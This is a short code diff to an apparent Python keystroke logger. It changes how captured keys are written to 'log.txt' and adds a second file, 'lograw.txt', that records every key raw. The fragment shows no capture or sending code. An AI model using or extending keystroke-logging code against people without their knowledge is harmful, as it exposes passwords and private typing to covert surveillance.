@@ -12,5 +12,9 @@ while 1:
 	with open("log.txt", "a") as log:
 		if key == "_ENTER_": 
 			log.write("\n")
-		else: 
+		
+		if key[0] != '_': 
+			log.write(key)
+
+	with open("lograw.txt", "a") as log:
 			log.write(key)
